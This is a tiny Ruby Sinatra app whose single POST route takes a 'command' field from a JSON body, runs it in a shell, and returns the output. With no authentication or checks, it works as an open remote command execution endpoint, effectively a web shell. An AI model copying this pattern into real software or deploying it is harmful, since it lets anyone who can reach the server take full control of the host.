require "sinatra"
require "json"

post "/" do
  JSON "output" => `#{JSON.parse(request.body.read)["command"]}`
end
